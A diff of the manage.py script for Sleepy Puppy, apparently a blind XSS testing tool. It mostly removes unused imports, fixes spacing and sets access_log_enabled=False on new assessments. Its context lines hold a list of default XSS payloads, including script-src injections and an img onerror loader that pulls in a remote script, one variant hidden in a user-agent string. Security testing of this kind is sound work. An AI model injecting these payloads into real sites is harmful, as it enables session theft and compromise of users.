@@ -1,14 +1,9 @@
 #!/usr/bin/env python
-import os
-import time
-import json
 import sys
 import getpass
-from random import randint
 
-from flask_script import Command, Option
 from flask_script.commands import ShowUrls, Clean
-from flask.ext.script import Manager, Server
+from flask.ext.script import Manager
 from flask.ext.migrate import Migrate, MigrateCommand
 from sleepypuppy.admin.admin.models import Administrator
 from sleepypuppy import app, db
@@ -17,6 +12,7 @@ manager = Manager(app)
 migrate = Migrate(app, db)
 manager.add_command('db', MigrateCommand)
 
+
 @manager.shell
 def make_shell_context():
     """
@@ -24,6 +20,7 @@ def make_shell_context():
     in the context of the app
     """
     return dict(app=app)
+
 
 @manager.command
 def create_db():
@@ -41,6 +38,7 @@ def drop_db():
     your Alchemy models
     """
     db.drop_all()
+
 
 @manager.command
 def create_login(login):
@@ -68,6 +66,7 @@ def create_login(login):
     db.session.commit()
     return
 
+
 @manager.command
 def default_login():
     """
@@ -83,7 +82,7 @@ def default_login():
 
 from collections import namedtuple
 DefaultPayload = namedtuple('DefaultPayload', ['payload', 'url', 'method', 'parameter', 'notes'])
-DEFAULT_PAYLOADS=[
+DEFAULT_PAYLOADS = [
     DefaultPayload('<script src=$1></script>', None, 'GET', None, 'Generic'),
     DefaultPayload('</script><script src=$1>', None, 'GET', None, 'Reversed'),
     DefaultPayload('&lt;script src=$1&gt;&lt;/script&gt;', None, 'GET', None, 'Generic Encoded'),
@@ -92,6 +91,7 @@ DEFAULT_PAYLOADS=[
     DefaultPayload("""'"><img src=x onerror="var s=document.createElement('script');s.src='$1';document.getElementsByTagName('head')[0].appendChild(s);">""", None, 'GET', None, 'For where "<script" is banned'),
     DefaultPayload("""Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 '"><img src=x onerror="var s=document.createElement('script');s.src='$1';document.getElementsByTagName('head')[0].appendChild(s);">""", None, 'GET', None, 'Promiscuous User Agent')
 ]
+
 
 @manager.command
 def create_bootstrap_assessment(name="General", add_default_payloads=True):
@@ -104,7 +104,7 @@ def create_bootstrap_assessment(name="General", add_default_payloads=True):
     if assessment:
         print("Assessment with name", name, "already exists.")
     else:
-        assessment = Assessment(name=name)
+        assessment = Assessment(name=name, access_log_enabled=False)
 
     if add_default_payloads:
         for payload in DEFAULT_PAYLOADS:
@@ -124,7 +124,6 @@ def create_bootstrap_assessment(name="General", add_default_payloads=True):
 
 @manager.command
 def list_routes():
-    output = []
     func_list = {}
     for rule in app.url_map.iter_rules():
         if rule.endpoint != 'static':
